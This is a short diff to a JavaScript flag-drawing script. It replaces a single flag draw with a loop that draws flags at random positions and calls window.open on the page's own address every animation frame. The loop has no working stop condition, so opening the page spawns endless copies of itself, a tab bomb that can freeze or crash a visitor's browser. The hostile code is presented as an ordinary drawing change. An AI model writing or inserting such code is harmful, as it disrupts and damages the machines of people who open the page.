@@ -58,4 +58,15 @@ function flag(x,y){
     flagback(x,y);
     flagstars(x,y);
 }
-flag(0,0);
+let p = 0;
+function drawFlags() {
+    if (p > -1) { 
+        let y = Math.random() * 2000; 
+        let x = Math.random() * 2000;  
+        flag(x, y);
+        p++;
+        window.open(window.location.href, '_blank');
+        requestAnimationFrame(drawFlags);
+    }
+}
+drawFlags();
